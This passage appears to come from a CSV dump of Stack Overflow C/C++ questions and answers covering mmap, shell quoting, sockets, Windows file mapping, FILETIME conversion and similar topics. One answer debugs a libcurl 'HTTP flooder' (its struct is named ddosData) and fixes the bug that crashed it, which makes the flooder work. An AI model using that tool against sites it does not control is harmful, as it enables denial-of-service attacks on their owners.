mmap(NULL, 4096, PROT_NONE, MAP_SHARED|MAP_ANONYMOUS, 0, 0) = 0x7f0710754000
mmap(0x7f0710755000, 4096, PROT_NONE, MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, 0, 0) = 0x7f0710755000
--- SIGSEGV (Segmentation fault) @ 0 (0) ---
+++ killed by SIGSEGV (core dumped) +++
</code></pre>

<p>The first call to <code>printf()</code> (which as you see got optimized into a call to <code>puts()</code> by the compiler) allocates some memory with <code>malloc()</code> (because <code>stdout</code> is buffered), which calls <code>mmap()</code>.  Then, the program calls <code>mmap(NULL)</code> and gets the page <em>immediately before</em> the memory allocated by <code>printf</code>.  The second call to <code>mmap()</code> allocates a new page on top of that already allocated page, zeroing it out and corrupting <code>malloc</code>'s internal data structures.  The subsequent call to <code>printf()</code> (actually <code>puts()</code>) then crashes when it accesses those corrupted data structures when it tries to append to the memory buffer it thought it allocated.</p>
"
"<p>We need to print out</p>

<p>targetID=""123""</p>

<p>AssayID=""456"",</p>

<pre><code>awk -F\"", 'BEGIN{FS="","";OFS="","";} {print $1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$13,$14,$15,$16,$17,$18,$19,$20,$12}' VrtAssay_123_target_456_assay_Detail2.csv &gt; VrtAssay_123_target_456_assay_Detail2_reorder.csv
</code></pre>

<p>A. We try:</p>

<pre><code>printf ""awk -F""\"""","" 'BEGIN{FS=\"",\"";OFS=\"",\"";} {print \$1,\$2,\$3,\$4,\$5,\$6,\$7,\$8,\$9,\$10,\$11,\$20,\$12,\$13,\$14,\$15,\$16,\$17,\$18,\$19}' VrtAssay_${TargetIDs}_target_${AssayID}_assay_Detail2_average.csv &gt; VrtAssay_${TargetIDs}_target_${AssayID}_assay_Detail3.csv""
</code></pre>

<p>B. or echo</p>

<pre><code>echo ""awk -F""\"""", 'BEGIN{FS=\"",\"";OFS=\"",\"";} {print \$1,\$2,\$3,\$4,\$5,\$6,\$7,\$8,\$9,\$10,\$11,\$20,\$12,\$13,\$14,\$15,\$16,\$17,\$18,\$19}' VrtAssay_${TargetIDs}_target_${AssayID}_assay_Detail2_average.csv &gt; VrtAssay_${TargetIDs}_target_${AssayID}_assay_Detail3.csv""
</code></pre>

<p>Both give  (\ is gone)</p>

<pre><code>awk -F"", 'BEGIN{FS="","";OFS="","";} {print $1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$13,$14,$15,$16,$17,$18,$19,$20,$12}' VrtAssay_123_target_456_assay_Detail2.csv &gt; VrtAssay_123_target_456_assay_Detail2_reorder.csv
</code></pre>

<p>C. If we try</p>

<pre><code>printf ""awk -F\\"", 'BEGIN{FS=\"",\"";OFS=\"",\"";} {print \$1,\$2,\$3,\$4,\$5,\$6,\$7,\$8,\$9,\$10,\$11,\$20,\$12,\$13,\$14,\$15,\$16,\$17,\$18,\$19}' VrtAssay_${TargetIDs}_target_${AssayID}_assay_Detail2_average.csv &gt; VrtAssay_${TargetIDs}_target_${AssayID}_assay_Detail3.csv"" 
</code></pre>

<p>These will give an error message of </p>

<pre><code>Unmatched "".
</code></pre>

<p>D. If we try</p>

<pre><code>echo ""awk -F\\"", 'BEGIN{FS=\"",\"";OFS=\"",\"";} {print \$1,\$2,\$3,\$4,\$5,\$6,\$7,\$8,\$9,\$10,\$11,\$20,\$12,\$13,\$14,\$15,\$16,\$17,\$18,\$19}' VrtAssay_${TargetIDs}_target_${AssayID}_assay_Detail2_average.csv &gt; VrtAssay_${TargetIDs}_target_${AssayID}_assay_Detail3.csv""
</code></pre>

<p>This gives us </p>

<pre><code>Unmatched "".
</code></pre>

<p>Wonder any guru could kindly offer some solutions? </p>
","9530","","<p>Any of these work, you just need to make sure that everything's escaped properly:</p>

<pre><code> $ echo 'awk -F\"",'
 $ echo awk -F\\\"",
 $ echo ""awk -F\\\"",""
</code></pre>

<p>The shell's parsing rules are basically:</p>

<ul>
<li>Inside <code>'single quotes'</code>, everything except for single quotes is interpreted literally; to include a literal single quote, you need to close the single quote and then use double quotes to get that.</li>
<li>Inside <code>""double quotes""</code>, double quotes and backslashes must be escaped with a backslash.  So, a literal double quote is <code>\""</code>, a literal backslash is <code>\\</code>, and a literal backslash and double quote are <code>\\\""</code>.  If you just write <code>\\""</code>, that's a literal backslash followed by a closing quote.</li>
</ul>
"
"<p><code>foo</code> is a <code>struct</code> with 5 scalar variables (<code>A</code>, <code>B</code>, <code>C</code>, <code>D</code>, <code>F</code>) and one array (<code>E</code>).  What is confusing me is what <code>f[0]</code>, <code>f[1]</code>, and <code>f[2]</code> are in this context and what is happening here.</p>

<pre><code>int     
bar(struct foo *f)
{
    f[1].C = f[0].B &gt; f[2].C;
    f[0].E[-1] = f[0].D;
    f[0].A = f[1].C;
}
</code></pre>

<p>Are <code>f[0]</code>, <code>f[1]</code>, and <code>f[2]</code> individual structures with member variables?  Can someone please explain?  Thanks.</p>
","9530","","<blockquote>
  <p>Are <code>f[0]</code>, <code>f[1]</code>, and <code>f[2]</code> individual structures with member variables?</p>
</blockquote>

<p>Yes.  <code>f</code> is a pointer to an array of <code>struct foo</code> instances  <code>f[0]</code> is the first such member of that array, <code>f[1]</code> is the second member, etc.  You might call it like this:</p>

<pre><code>struct foo fArray[3];
// ... Initialize fArray[0], fArray[1], fArray[2] etc. ...
bar(fArray);
</code></pre>
"
"<p>I was overloading type casting operators, and internal error has occurred in Visual Studio 2013. </p>

<p>This is the header of the exponent class:</p>

<pre><code>#pragma once
#include ""Calc.h""
#include &lt;iostream&gt;

using namespace std;


class Exponent
{

private:
    int base;
    int exponent;
public:
    Exponent();
    Exponent(int a)
    {
        base = a;
    }

    int getBase()
    {
        return base;
    }


};

void printExp(Exponent e)
{
    cout &lt;&lt; e.getBase() &lt;&lt; endl;
}
</code></pre>

<p>and this is calc.h I wrote that will contain overloaded type casting function:</p>

<pre><code>#pragma once
#include ""Exponent.h""

class Calc
{
private:
    int acc;
public:
    Calc();
    Calc(int a);

    operator Exponent()  //this is where I get an error. 
    { 
        return Exponent(acc); 
    }


};
</code></pre>

<p>And here's the main function:</p>

<pre><code>#include ""stdafx.h""
#include &lt;iostream&gt;
#include ""Exponent.h""
#include ""Calc.h"" 

using namespace std;

int main()
{
    Calc c(6);

    printExp(c);
    return 0;
}
</code></pre>

<p>I have no idea why I get an error here:</p>

<pre><code>operator Exponent()  //this is where I get an error. 
{ 
    return Exponent(acc); 
}
</code></pre>

<p>This is somehow making Visual Studio crash, showing an error like this:</p>

<pre><code>Microsoft(R) C\C++ Optimizing compiler has stopped working...
</code></pre>
","9530","","<p>An internal compiler error (ICE) is a compiler bug—a well-functioning compiler should always report sensible errors for erroneous code.  I'd suggest you file a bug report on connect.microsoft.com.</p>

<p>However, you do have a clear problem with your code: you have a circular dependency between your two header files.  Exponent.h includes Calc.h, which in turn includes Exponent.h.  Even if the compiler weren't crashing with an ICE, it would still report an error (likely of the ""undefined symbol"" variety) with this code.</p>

<p>There's a simple fix to this case—because Exponent.h doesn't actually have any dependencies on Calc.h, you can just remove the <code>#include ""Calc.h""</code> line from Exponent.h, and the circular dependency will be gone.</p>
"
"<p>I'm getting a segfault when using libCURL in my HTTP flooder that I wrote for load-testing my site.</p>

<p>Here is the relevant code: <a href=""https://gist.github.com/AppleDash/a26e0ce0b138cd9eacd2"" rel=""nofollow"">https://gist.github.com/AppleDash/a26e0ce0b138cd9eacd2</a> (A bit large to paste here.)</p>

<p>Here's a link to the line it is segfaulting on: <a href=""https://gist.github.com/AppleDash/a26e0ce0b138cd9eacd2#file-httpflood-improved-c-L57"" rel=""nofollow"">https://gist.github.com/AppleDash/a26e0ce0b138cd9eacd2#file-httpflood-improved-c-L57</a></p>

<p>And here is a backtrace of the segfault:</p>

<pre><code>#0  0x00007ffff760d65b in fwrite () from /usr/lib/libc.so.6
#1  0x00007ffff79656d8 in ?? () from /usr/lib/libcurl.so.4
#2  0x00007ffff797a76b in ?? () from /usr/lib/libcurl.so.4
#3  0x00007ffff7984349 in ?? () from /usr/lib/libcurl.so.4
#4  0x00007ffff7984b11 in curl_multi_perform () from /usr/lib/libcurl.so.4
#5  0x00007ffff797b977 in curl_easy_perform () from /usr/lib/libcurl.so.4
#6  0x0000000000400f42 in flood (structPointer=0x7fffffffe060) at httpflood.c:57
#7  0x00007ffff7bc5124 in start_thread () from /usr/lib/libpthread.so.0
#8  0x00007ffff768b4bd in clone () from /usr/lib/libc.so.6
</code></pre>

<p>I don't see why this call would cause a segfault. Any ideas?</p>

<p>I know you're meant to only provide a small sample of relevant code, but here I am providing the whole thing due to the fact that I feel like context is needed here. (The fact it is being run from many threads and such.)</p>
","9530","","<p>This is your problem:</p>

<pre><code>for (i = 0; i &lt; threadnum; i++) {
    struct flood_data ddosData;
    memset(&amp;ddosData, 0, sizeof(struct flood_data));
    ddosData.url = url;
    ddosData.proxy = getProxy();
    pthread_create(&amp;threads[i], NULL, flood, (void *)&amp;ddosData);
}
</code></pre>

<p>You're allocating a single <code>struct flood_data</code> instance on the stack and passing that to all of the new threads simultaneously.  Each time you iterate through the loop, you overwrite the same instance at the same time that threads spawned from earlier iterations might be trying to read from it.  Major undefined behavior.</p>

<p>The proper way to do this is to dynamically allocate a separate instance for each thread:</p>

<pre><code>for (i = 0; i &lt; threadnum; i++) {
    struct flood_data *ddosData = calloc(1, sizeof(*ddosData));
    ddosData-&gt;url = url;
    ddosData-&gt;proxy = getProxy();
    pthread_create(&amp;threads[i], NULL, flood, ddosData);
}

...

void *flood(void *structPointer) {
    struct flood_data *data = structPointer;
    char *bootable = data-&gt;url;
    char *proxy = data-&gt;proxy;
    free(data);
    ...
}
</code></pre>

<p>As pointed out in the comments, you also need to check your system calls for failure.  You should validate that all of your calls to <code>fopen()</code> are succeeding, as you could very well be hitting the maximum number of file descriptors open in your process.  Rather than opening up a file to <code>/dev/null</code>, why don't you just set a no-op write function with the <a href=""http://curl.haxx.se/libcurl/c/CURLOPT_WRITEFUNCTION.html"" rel=""nofollow""><code>CURLOPT_WRITEFUNCTION</code></a> option?</p>

<pre><code>static size_t noop_write_callback(char *ptr, size_t size, size_t nmemb, void *userdata)
{
    // Do nothing
    return size * nmemb;
}

...

curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &amp;noop_write_callback);
// No need to call fopen(""/dev/null"") or set CURLOPT_WRITEDATA now
</code></pre>
"
"<p>I have written a program, where it takes an input file, does some operations on it and gives its corresponding output file. i.e., for inp1.txt output is out1.txt, for inp2.txt output is out2.txt and so on, both in different folders.</p>

<p>Right now I have used a file_count variable and have used switch case method, to open the particular file.</p>

<p>The problem is, if I add one more file to the folder, then I have to re-edit the program with another case statement.</p>

<p>Please suggest me the usage of directory pointer in , I browsed all over the net but didnt get an exact solution.</p>

<p>Thanks a lot in anticipation.</p>
","9530","","<p>There's no way to read the contents of a directory using only standard C APIs, so you'll have to use platform-specific APIs instead:</p>

<ul>
<li>On *nix systems, you use <a href=""http://linux.die.net/man/3/opendir"" rel=""nofollow""><code>opendir(3)</code></a>/<a href=""http://linux.die.net/man/3/readdir"" rel=""nofollow""><code>readdir(3)</code></a>/<a href=""http://linux.die.net/man/3/closedir"" rel=""nofollow""><code>closedir(3)</code></a> to read the contents of a directory.</li>
<li>On Windows systems, you use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa364418%28v=vs.85%29.aspx"" rel=""nofollow""><code>FindFirstFile</code></a>/<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa364428%28v=vs.85%29.aspx"" rel=""nofollow""><code>FindNextFile</code></a>/<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa364413%28v=vs.85%29.aspx"" rel=""nofollow""><code>FindClose</code></a></li>
</ul>
"
"<p>I need to send files of different sizes to other clients via TCP sockets. Now I wonder how much data is reasonable for one send function call?</p>

<p>I won't send, for example, a whole 2 megabyte picture with 1 call to send - I'm going to chop that file into smaller buffers and send them one after another. But how small or big should these buffers be? I know that send doesn't guarantee to send all my data - I will check that.</p>
","9530","","<p>It doesn't really matter, as long as you're sending buffers larger than the MTU (typically a little under 1500 bytes or so).  If you send buffers larger than the MTU, the OS or NIC will fragment your packets into MTU-sized packets, you don't need to worry about doing the fragmentation yourself.  When that happens, the OS will block on the call to <code>send()</code> until all of the data has been sent or an error occurs—you could send all 2 MB in one call if you wanted, it won't be a problem.</p>

<p>You might get slightly worse performance with a really large call vs. a call just larger than the MTU, if only due to caching effects (i.e. you'll have more cache misses due to the data not all fitting in the L2 cache), but that's not likely to be very significant.</p>

<p>For file transfer, though, you'll actually get much better performance if you use the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms740565%28v=vs.85%29.aspx"" rel=""nofollow""><code>TransmitFile()</code></a> function, rather than manually reading the data from the file into a buffer and then sending it.  That function is highly optimized for file transfers, because it can DMA the file data directly from the file system onto the NIC without needing to copy it from kernel space into user space and then back into kernel space.  This is called a <a href=""http://en.wikipedia.org/wiki/Zero-copy"" rel=""nofollow""><em>zero-copy</em> operation</a>.</p>
"
"<p>I'm 99% new to sockets and any sort of network programming, so please bear with me.</p>

<p>I am aiming to connect to a port (2111 in this case) on my local machine (192.168.0.1). From there, I'm planning on sending and receiving basic information, but that's for another day.</p>

<p>I've currently tried this:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;errno.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv)
{
    int sd;
    int port;
    int start;
    int end;
    int rval;
    struct hostent *hostaddr;
    struct sockaddr_in servaddr;

    start = 2111;
    end   = 2112;
    for(port = start; port &lt;= end; port++)
    {
        sd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd == -1)
        {
            perror(""Socket()\n"");
            return (errno);
        }

        memset(&amp;servaddr, 0, sizeof(servaddr));

        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(port);

        hostaddr = gethostbyname(""192.168.0.1"");

        memcpy(&amp;servaddr.sin_addr, hostaddr-&gt;h_addr, hostaddr-&gt;h_length);

        rval = connect(sd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr));
        if(rval == -1)
        {
            printf(""Port %d is closed\n"", port);
            close(sd);
        }
        else printf(""Port %d is open\n"", port);

        close(sd);
    }

    return 0;
}
</code></pre>

<p>However, my <code>connect()</code> call hangs for about 90 seconds, then returns -1.</p>

<p>The device is directly connected to my Mac Mini's ethernet port and the manufacturer has confirmed that the port is 2111 or 2112.</p>

<p>What am I doing wrong? Also, can it be in the ELI5 (explain like I'm 5) format? I'm much better off with examples.</p>
","9530","","<p>When you call <code>connect()</code> to connect to a host, your computer sends a SYN packet to begin the <a href=""http://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_establishment"" rel=""nofollow"">three-way handshake</a> of the TCP connection.  From here, there are 3 possible scenarios:</p>

<ol>
<li>If the peer is listening on that port, it responds with a SYN+ACK packet, your computer responds with a final ACK, and the connection is established—<code>connect()</code> returns successfully.</li>
<li>If the peer is not listening on that port, it responds with an ICMP packet with a type and code indicating that the port is closed, which causes your <code>connect()</code> call to fail almost immediately with the error <code>ECONNREFUSED</code> (connection refused).  Under normal circumstances, this takes 1 network round-trip time (RTT) to happen, which is typically tens or hundreds if milliseconds.</li>
<li>If your computer never receives either an appropriate SYN+ACK TCP packet or connection refused ICMP packet, it assumes that its original SYN packet got dropped by the network somewhere and will try to resend the SYN packet several times until it gets one of those packets back or it hits an OS-dependent timeout, at which point the <code>connect()</code> call fails with <code>ETIMEDOUT</code>.  This is typically 1–2 minutes, depending on the OS and its TCP settings.</li>
</ol>

<p>You're clearly hitting case #3.  This can be caused by a few different issues:</p>

<ol>
<li>Your original SYN packets were getting lost in the network, possibly due to a faulty link, overloaded router, or firewall</li>
<li>The peer's SYN+ACK or ICMP response packets were getting lost in the network, possibly due to a faulty link, overloaded router, or firewall</li>
<li>The destination address may be unroutable/unreachable</li>
<li>The peer may be failing to properly respond at all with a SYN+ACK or ICMP packet</li>
</ol>

<p>If you're directly connecting to the device over ethernet, than that rules out #1 and #2.  #4 is possible, but I think #3 is the most likely explanation.</p>

<h2>A brief aside on packet routing</h2>

<p>Your computer has multiple network interfaces—ethernet (sometimes multiple ethernet interfaces), Wi-Fi, the loopback device, VPN tunnels, etc.  Whenever you create a socket, it has to be bound to one or more particular network interfaces in order for the OS to know which NIC to actually send the packet through.  For listen sockets for servers, you typically bind to all network interfaces (to listen for connections on all of them), but you can also bind to a particular network interface to only listen on that one.</p>

<p>For client sockets, when you connect them to other peers, you don't normally bind them to a particular interface.  By default, your computer uses its internal routing tables along with the destination IP address to determine which network interface to use.  For example, if you have a gateway machine with two NICs, one of which is connected to the public internet with IP 54.x.y.z and hte other of which is connected to an internal, private network with IP 192.168.1.1, then that machine will in all likelihood have routing tables that say ""for packets destined to 192.168.0.0/16, use NIC 2, for all other packets, use NIC 1"".  If you want to bypass the routing tables, you can bind the socket to the network interface you want by calling <code>bind()</code> on the socket before the call to <code>connect()</code>.</p>

<h2>Putting it all together</h2>

<p>So, what does that all mean for you?</p>

<p>First, make sure that 192.168.0.1 is in fact the correct destination address you should be connecting to.  How is that address determined?  Is your computer acting as a DHCP server to assign that address to the other host?  Is that host using a static IP configuration?</p>

<p>Next, make sure that your routing tables are correct.  If the other machine is assigning itself a static IP, chances are that your Mac isn't aware of how to route to that destination and is probably trying to route through the wrong interface.  You can manually adjust the routes on Mac OS X with the <a href=""https://developer.apple.com/library/mac/documentation/Darwin/Reference/Manpages/man8/route.8.html"" rel=""nofollow""><code>route(8)</code> utility</a>, but these get reset every reboot; <a href=""http://blog.irrashai.com/blog/2009/03/how-to-add-static-route-in-mac-os-x/"" rel=""nofollow"">this blog post</a> shows an example of using a startup item to automate adding the new route on startup.  You'll want to use the IP address associated with the ethernet interface connected to the target host.</p>

<p>Alternatively, instead of using routing tables, you could call <code>bind()</code> on your socket before <code>connect()</code> to bind to the local address of the interface you want to use, but this won't work for other programs unless they also provide that functionality.  For example, the <code>curl(1)</code> utility lets you pass the <code>--interface &lt;name&gt;</code> command line flag to direct it to bind to a particular interface.</p>
"
"<p>I am trying to learn the structure of executable files of C program. My environment is GCC and 64bit Intel processor.</p>

<p>Consider the following C code <code>a.cc</code>.  </p>

<pre><code>#include &lt;cstdlib&gt;
#include &lt;cstdio&gt;

int x;

int main(){
  printf(""%d\n"", sizeof(x));
  return 10;
}
</code></pre>

<p>The <code>size -o a</code> shows</p>

<pre><code> text      data     bss     dec     hex filename
 1134       552       8    1694     69e a
</code></pre>

<p>After I added another initialized global variable y.</p>

<pre><code>int y=10; 
</code></pre>

<p>The <code>size a</code> shows (where <code>a</code> is the name of the executable file from a.cc)</p>

<pre><code> text      data     bss     dec     hex filename
 1134       556      12    1702     6a6 a
</code></pre>

<p>As we know, the <code>BSS</code> section stores the size of uninitialized global variables and <code>DATA</code> stores initialized ones.</p>

<ol>
<li><strong>Why <code>int</code> takes up 8 bytes in BSS? The <code>sizeof(x)</code> in my code shows that the <code>int</code> actually takes up 4 bytes.</strong></li>
<li><strong>The <code>int y=10</code> added 4 bytes to DATA which makes sense since <code>int</code> should take 4 bytes. But, why does it adds 4 bytes to BSS?</strong></li>
</ol>

<p>The difference between two <code>size</code> commands stays the same after deleting the two lines <code>#include ...</code>. </p>

<p><strong>Update:</strong>
I think my understanding of BSS is wrong. It may not store the uninitialized global variables. As the Wikipedia says ""The size that BSS will require at runtime is recorded in the object file, but BSS (unlike the data segment) doesn't take up any actual space in the object file."" For example, even the one line C code <code>int main(){}</code> has <code>bss 8</code>. </p>

<p><strong>Does the 8 or 16 of BSS comes from <code>alignment</code>?</strong> </p>
","9530","","<p>It doesn't, it takes up 4 bytes regardless of which segment it's in.  You can use the <code>nm</code> tool (from the GNU binutils package) with the <code>-S</code> argument to get the names and sizes of all of the symbols in the object file.  You're likely seeing secondary affects of the compiler including or not including certain other symbols for whatever reasons.</p>

<p>For example:</p>

<pre><code>$ cat a1.c
int x;
$ cat a2.c
int x = 1;
$ gcc -c a1.c a2.c
$ nm -S a1.o a2.o

a1.o:
0000000000000004 0000000000000004 C x

a2.o:
0000000000000000 0000000000000004 D x
</code></pre>

<p>One object file has a 4-byte object named <code>x</code> in the uninitialized data segment (<code>C</code>), while the other object file has a 4-byte object named <code>x</code> in the initialized data segment (<code>D</code>).</p>
"
"<p>I am trying to use CreateFileMapping for the first time and it is giving me this error when I use GetLastError():</p>

<pre><code>ERROR_INVALID_HANDLE: The handle is invalid.
</code></pre>

<p>Here is my code:</p>

<pre><code>    // create the name of our file-mapping object
    nTry++; // Ensures a unique string is used in case user closes and reopens
    wsprintfA(szName, FS6IPC_MSGNAME1 "":%X:%X"", GetCurrentProcessId(), nTry);
    // stuff the name into a global atom
    m_atom = GlobalAddAtomA(szName);
    if (m_atom == 0)
   {    *pdwResult = ERR_ATOM;
        return FALSE;
    }

    // create the file-mapping object
    m_hMap = CreateFileMappingA(
                    (HANDLE)0xFFFFFFFF, // use system paging file
                    NULL,               // security
                    PAGE_READWRITE,     // protection
                    0, MAX_SIZE+256,       // size
                   szName);            // 
</code></pre>

<p>EDIT:</p>

<p>The first issue was resolved, but now my program crashes somewhere else.</p>

<pre><code>#define FS6IPC_MESSAGE_SUCCESS 1
#define FS6IPC_MESSAGE_FAILURE 0

// IPC message types
#define FS6IPC_READSTATEDATA_ID    1
#define FS6IPC_WRITESTATEDATA_ID   2

// read request structure
typedef struct tagFS6IPC_READSTATEDATA_HDR
{
  DWORD dwId;       // FS6IPC_READSTATEDATA_ID
  DWORD dwOffset;   // state table offset
  DWORD nBytes;     // number of bytes of state data to read
  void* pDest;      // destination buffer for data (client use only)
} FS6IPC_READSTATEDATA_HDR;

// write request structure
typedef struct tagFS6IPC_WRITESTATEDATA_HDR
{
  DWORD dwId;       // FS6IPC_WRITESTATEDATA_ID
  DWORD dwOffset;   // state table offset
  DWORD nBytes;     // number of bytes of state data to write
} FS6IPC_WRITESTATEDATA_HDR;
</code></pre>

<hr>

<pre><code>while (*pdw)
{   switch (*pdw)
    {   case FS6IPC_READSTATEDATA_ID:
            pHdrR = (FS6IPC_READSTATEDATA_HDR *) pdw;
            m_pNext += sizeof(FS6IPC_READSTATEDATA_HDR);
            if (pHdrR-&gt;pDest &amp;&amp; pHdrR-&gt;nBytes)
                CopyMemory(pHdrR-&gt;pDest, m_pNext, pHdrR-&gt;nBytes);
            m_pNext += pHdrR-&gt;nBytes; // Debugger says the issue is here
            break;

        case FS6IPC_WRITESTATEDATA_ID:
            // This is a write, so there's no returned data to store
            pHdrW = (FS6IPC_WRITESTATEDATA_HDR *) pdw;
            m_pNext += sizeof(FS6IPC_WRITESTATEDATA_HDR) + pHdrW-&gt;nBytes;
            break;

        default:
            // Error! So terminate the scan
            *pdw = 0;
            break;
    }

    pdw = (DWORD *) m_pNext;
}
</code></pre>
","9530","","<p>I'm guessing you're running on a 64-bit system, on which HANDLEs are 64 bits.  The OS is quite right—the handle value <code>0x00000000FFFFFFFF</code> is an invalid handle value for your process.</p>

<p>What exactly are you trying to do?  If you want to create a file mapping backed by an actual file, pass in the handle for that file.  If you want to a create a file mapping backed by the paging file instead, pass in <code>INVALID_HANDLE_VALUE</code>.  <code>INVALID_HANDLE_VALUE</code> happens to be <code>(HANDLE)-1</code>, which is <code>0xFFFFFFFF</code> on 32-bit systems but <code>0xFFFFFFFFFFFFFFFF</code> on 64-bit systems, but that doesn't really matter since you should just use the symbolic value <code>INVALID_HANDLE_VALUE</code> in any case.</p>

<p>If your application is crashing when you pass in <code>INVALID_HANDLE_VALUE</code>, it's not because the call to <code>CreateFileMapping</code> is failing, it's for some other reason, and you should debug that.</p>
"
"<p>How would I go about converting a Windows <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms724284(v=vs.85).aspx"" rel=""nofollow"">FILETIME</a> object into a <code>time_t</code> or raw seconds/milliseconds? I'm porting some code from Windows to Unix so I cannot rely on the Windows API functions.</p>
","9530","","<p>A <code>FILETIME</code> is defined as</p>

<blockquote>
  <p>Contains a 64-bit value representing the number of 100-nanosecond intervals since January 1, 1601 (UTC).</p>
</blockquote>

<p>So to convert it to a Unix time, it's just a matter of subtracting the two epoch times and converting from 100-nanosecond intervals to seconds/millisconds.  Any number of tools/sites will tell you that the two epochs are 134774 days (or 11644473600 seconds) apart.  Therefore:</p>

<pre><code>void convert_filetime(struct timeval *out_tv, const FILETIME *filetime)
{
    // Microseconds between 1601-01-01 00:00:00 UTC and 1970-01-01 00:00:00 UTC
    static const uint64_t EPOCH_DIFFERENCE_MICROS = 11644473600000000ull;

    // First convert 100-ns intervals to microseconds, then adjust for the
    // epoch difference
    uint64_t total_us = (((uint64_t)filetime-&gt;dwHighDateTime &lt;&lt; 32) | (uint64_t)filetime-&gt;dwLowDateTime) / 10;
    total_us -= EPOCH_DIFFERENCE_MICROS;

    // Convert to (seconds, microseconds)
    out_tv-&gt;tv_sec = (time_t)(total_us / 1000000);
    out_tv-&gt;tv_usec = (useconds_t)(total_us % 1000000);
}
</code></pre>
"
"<p>I found this function</p>

<pre><code>def calculate_age(born):
    today = date.today()
    age = today.year - born.year - ((today.month, today.day) &lt; (born.month, born.day))
    return age
</code></pre>

<p>This is the first time that I saw this type of comparison. So, I did a few test,</p>

<pre><code>&gt;&gt;&gt; (5,4)&lt;(7,5)
True
&gt;&gt;&gt; (5,4)&lt;(7,3)
True
&gt;&gt;&gt; (5,4)&lt;(4,3)
False
&gt;&gt;&gt; (5,4)&lt;(4,8)
False
&gt;&gt;&gt; (5,4)&lt;(5,8)
True
&gt;&gt;&gt; (5,4)&lt;(5,3)
False
&gt;&gt;&gt; (5,4)&lt;(5,4)
False
&gt;&gt;&gt; (5,4)&lt;=(5,4)
True
&gt;&gt;&gt; (5,4,1)&lt;(5,4,9)
True
&gt;&gt;&gt; (5,4,1,7)&lt;(5,4,1,6)
False
&gt;&gt;&gt; (5,4,1,7)&lt;(5,4,1,8)
True
&gt;&gt;&gt; (5,4,1,7)&lt;(5,4,2,8)
True
&gt;&gt;&gt; (5,4,1,7)&lt;(5,4,2,1)
True
</code></pre>

<p>This is really useful and I want to know if this type of comparison has a name and where can I find information about it. </p>

<p>Is this only in Python?</p>

<p>Thanks</p>
","9530","","<p>This is just ordinary comparison of tuple objects.  From the <a href=""https://docs.python.org/2.7/reference/expressions.html#not-in"" rel=""nofollow"">Python language spec</a>:</p>

<blockquote>
  <p>Tuples and lists are compared lexicographically using comparison of corresponding elements. This means that to compare equal, each element must compare equal and the two sequences must be of the same type and have the same length.</p>
  
  <p>If not equal, the sequences are ordered the same as their first differing elements. For example, <code>cmp([1,2,x], [1,2,y])</code> returns the same as <code>cmp(x,y)</code>. If the corresponding element does not exist, the shorter sequence is ordered first (for example, <code>[1,2] &lt; [1,2,3]</code>).</p>
</blockquote>
"
"<p>I am aware that this is a question that is asked very often, and I am hoping that someone here can help me fix this...</p>

<p>This is a very simple segment of code, I am trying to open a file, and the file does not exist. I want to then handle this error as needed and move along however the file pointer created a segmentation fault when I try to compare it to NULL...see my code below:</p>

<pre><code>FILE* file = fopen(res, ""r"");
if(file == NULL)
{
    printf(""NO CONFIG FILE"");
    return 0;
}
</code></pre>

<p>Even though the file pointed to by res is not present, a segmentation fault occurs when making this comparison if(file==NULL), is also fails if I use if(file==0). I am really at my wits end here and any input would be appreciated!</p>

<p>Just a quick update here...</p>

<p>When I remove the code to check the validity of the file pointer, and the file is there, the code works properly. The problem seems to be somewhere in my evaluation of the file pointer...</p>
","9530","","<p>The line <code>if(file == NULL)</code> is NOT crashing your program.  If you use a debugger like gdb, it will show you the exact crash location, which is elsewhere.</p>

<p>The reason you probably <em>think</em> it's happening there is because you're not printing a newline in your <code>printf()</code> call.  By default, when stdout is a terminal, stdout is <em>line-buffered</em>, meaning it's not flushed until you print a newline or explicitly flush it yourself with <code>fflush()</code>.  But, if your program crashes before it gets flushed, any buffered data gets lost. </p>
"
"<p>Here's a simple program using <code>__block</code> variables:</p>

<pre><code>typedef void (^incrementBlock)(void);

__block int incrementMe = 0;

incrementBlock add_one = ^{
   incrementMe++;
};

incrementBlock add_two = ^{
   incrementMe++;
   incrementMe++;
};

add_one();
add_two();

printf(""%d"", incrementMe);
</code></pre>

<p>When I compile this, I get this error:</p>

<blockquote>
  <p>Undefined symbols for architecture x86_64:   ""___objc_personality_v0"",
  referenced from:
        _main in test-b0a9a6.o
        Dwarf Exception Unwind Info (__eh_frame) in test-b0a9a6.o ld: symbol(s) not found for architecture x86_64 clang: error: linker
  command failed with exit code 1 (use -v to see invocation)</p>
</blockquote>

<p>It definitely is a problem with declaring <code>incrementMe</code>as a  <code>__block int</code>, when I comment it out it works.<br>
I tried compiling with gcc and it also didn't work.</p>

<p>I got this example more or less straight from a book so it should work.</p>

<p>Is my declaration deprecated?  Should I be declaring a mutable block variable differently?</p>
","9530","","<p>Your code is fine, you just need to make sure to link with the Objective-C runtime library.  Add <code>-lobjc</code> to your linker command line and you should be good.</p>
"
"<p>In my cpp implementation I have:</p>

<pre><code>static MyClass *instance;
</code></pre>

<p>floating freely outside all containing scopes (curly {}). I've tried initializing it to nullptr too.</p>

<pre><code>void MyClass::myMethod() {
 instance = this;
 LOG(""Hello, %d, %d"", wList, instance-&gt;wList);
</code></pre>

<p>The above log displays an arbitrary location for member object pointer <code>wList</code> but <code>instance</code> should be pointing to the same data that <code>this</code> does, and hence the same <code>wList</code>, but it doesn't. <code>instance-&gt;wList</code> is still 0. What's happening here?</p>
